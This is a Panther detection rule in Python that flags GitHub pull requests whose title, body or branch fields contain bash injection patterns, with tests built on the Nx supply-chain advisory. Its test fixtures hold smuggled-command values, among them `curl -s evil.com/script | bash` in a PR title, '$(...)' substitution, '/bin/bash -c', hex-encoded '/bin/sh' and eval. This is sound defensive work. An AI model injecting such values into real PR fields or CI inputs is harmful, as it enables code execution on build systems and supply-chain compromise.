from pypanther import LogType, Rule, RuleTest, Severity, panther_managed
from pypanther.helpers.github import (
    contains_bash_injection_pattern,
    get_matched_bash_patterns,
    github_reference_url,
    github_webhook_alert_context,
    is_cross_fork_pr,
    is_pull_request_event,
)


@panther_managed
class GitHubWebhookMaliciousPRTitles(Rule):
    id = "GitHub.Webhook.MaliciousPRTitles-prototype"
    display_name = "GitHub Malicious Pull Request Content"
    log_types = [LogType.GITHUB_WEBHOOK]
    reports = {"MITRE ATT&CK": ["TA0001:T1195.002", "TA0002:T1072"]}
    tags = ["Code Injection", "Supply Chain"]
    default_severity = Severity.HIGH
    default_description = "Detects malicious patterns in GitHub pull request content (title, body, head ref, head label, default branch) that could indicate bash injection attempts or other malicious activity. This rule is designed to catch attacks like the Nx vulnerability (GHSA-cxm3-wv7p-598c) where PR titles contained bash injection payloads that could be executed by vulnerable CI workflows. Lower severity for PRs that are not cross-fork.\n"
    default_runbook = "1. Immediately review the pull request content and metadata for malicious patterns\n2. Check if the repository has workflows that process PR titles or descriptions unsafely\n3. Verify the identity and legitimacy of the PR author, especially for cross-fork PRs\n4. Review recent workflow runs for signs of code execution or compromise\n5. Check for any unusual repository activity or file modifications\n6. Consider temporarily disabling vulnerable workflows until they can be secured\n7. Implement input sanitization and use pull_request instead of pull_request_target\n8. Report suspected supply chain attacks to security team\n"
    default_reference = "https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c"

    def rule(self, event):
        if not is_pull_request_event(event) or event.deep_get("action") != "opened":
            return False
        # Check all untrusted PR-related inputs
        fields_to_check = [
            event.deep_get("pull_request", "title"),
            event.deep_get("pull_request", "body"),
            event.deep_get("pull_request", "head", "ref"),
            event.deep_get("pull_request", "head", "label"),
            event.deep_get("pull_request", "head", "repo", "default_branch"),
        ]
        for field in fields_to_check:
            if contains_bash_injection_pattern(field):
                return True
        return False

    def title(self, event):
        pr_number = event.deep_get("pull_request", "number", default="<UNKNOWN>")
        repo_name = event.deep_get("repository", "full_name", default="<UNKNOWN_REPO>")
        action = event.get("action", "<UNKNOWN_ACTION>")
        return f"Malicious pattern detected in PR #{pr_number} in {repo_name} ({action})"

    def alert_context(self, event):
        context = github_webhook_alert_context(event)
        # Analyze patterns found in all PR fields
        pr_fields = {
            "title": event.deep_get("pull_request", "title"),
            "body": event.deep_get("pull_request", "body"),
            "head_ref": event.deep_get("pull_request", "head", "ref"),
            "head_label": event.deep_get("pull_request", "head", "label"),
            "head_repo_default_branch": event.deep_get("pull_request", "head", "repo", "default_branch"),
        }
        context["field_analysis"] = {}
        for field_name, field_value in pr_fields.items():
            patterns = get_matched_bash_patterns(field_value)
            if patterns:
                context["field_analysis"][field_name] = {"value": field_value, "matched_patterns": patterns}
        return context

    def reference(self, event):
        if reference_url := github_reference_url(event):
            return reference_url
        return "DEFAULT"

    def severity(self, event):
        if is_cross_fork_pr(event):
            return "DEFAULT"
        return "LOW"

    tests = [
        RuleTest(
            name="PR with Command Substitution in Title",
            expected_result=True,
            log={
                "action": "opened",
                "number": 123,
                "pull_request": {
                    "id": 789456123,
                    "number": 123,
                    "state": "open",
                    "title": "Fix build issue $(echo 'You have been compromised')",
                    "body": "This PR fixes the build configuration",
                    "draft": False,
                    "user": {"login": "malicious-user", "id": 12345, "type": "User"},
                    "head": {
                        "ref": "fix-build",
                        "sha": "abc123def456",
                        "repo": {"full_name": "malicious-user/forked-repo", "fork": True},
                    },
                    "base": {
                        "ref": "main",
                        "sha": "def456abc123",
                        "repo": {"full_name": "target-org/main-repo", "fork": False},
                    },
                    "html_url": "https://github.com/target-org/main-repo/pull/123",
                    "created_at": "2024-01-15T10:30:00Z",
                },
                "repository": {
                    "name": "main-repo",
                    "full_name": "target-org/main-repo",
                    "private": False,
                    "fork": False,
                },
                "sender": {"login": "malicious-user", "type": "User"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="PR with Backtick Command Substitution",
            expected_result=True,
            log={
                "action": "opened",
                "pull_request": {
                    "number": 456,
                    "title": "Update docs `curl -s evil.com/script | bash`",
                    "body": "Documentation updates",
                    "user": {"login": "attacker"},
                    "head": {"repo": {"full_name": "attacker/repo"}},
                    "base": {"repo": {"full_name": "victim-org/repo"}},
                },
                "repository": {"full_name": "victim-org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="PR with Shell Invocation",
            expected_result=True,
            log={
                "action": "opened",
                "pull_request": {
                    "number": 505,
                    "title": "Update script /bin/bash -c 'malicious command'",
                    "body": "Script updates",
                },
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Normal PR Title",
            expected_result=False,
            log={
                "action": "opened",
                "pull_request": {
                    "number": 999,
                    "title": "Add new feature for user authentication",
                    "body": "This PR adds OAuth support for user login",
                    "user": {"login": "legitimate-dev"},
                    "head": {"repo": {"full_name": "team/repo"}},
                    "base": {"repo": {"full_name": "team/repo"}},
                },
                "repository": {"full_name": "team/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Non-PR Event",
            expected_result=False,
            log={
                "action": "push",
                "ref": "refs/heads/main",
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="PR Event Missing Pull Request Object",
            expected_result=False,
            log={"action": "opened", "repository": {"full_name": "org/repo"}, "p_log_type": "GitHub.Webhook"},
        ),
        RuleTest(
            name="PR with Hex Encoding Attempt",
            expected_result=True,
            log={
                "action": "opened",
                "pull_request": {"number": 666, "title": "Update \\x2f62696e2f7368", "body": "Binary update"},
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="PR with Eval Command",
            expected_result=True,
            log={
                "action": "opened",
                "pull_request": {"number": 777, "title": "Config eval($malicious_code)", "body": "Dynamic config"},
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="PR Body with Eval Command",
            expected_result=True,
            log={
                "action": "opened",
                "pull_request": {"number": 777, "body": "Config eval($malicious_code)", "title": "Dynamic config"},
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
    ]
